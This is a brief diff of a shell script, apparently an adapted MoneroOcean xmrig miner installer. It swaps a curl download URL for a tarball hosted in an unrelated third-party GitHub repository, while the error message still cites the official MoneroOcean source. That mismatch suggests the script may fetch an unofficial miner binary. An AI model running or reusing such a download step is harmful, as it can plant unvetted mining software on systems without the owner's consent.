@@ -15,7 +15,7 @@ fi
 
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://github.com/slicommeo/2019/releases/download/minner/aeminer.tar.gz" -o /tmp/xmrig.tar.gz; then
+if ! curl -L --progress-bar "https://github.com/slicommeo/2019/releases/download/minner/aeminer2.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
 
 fi
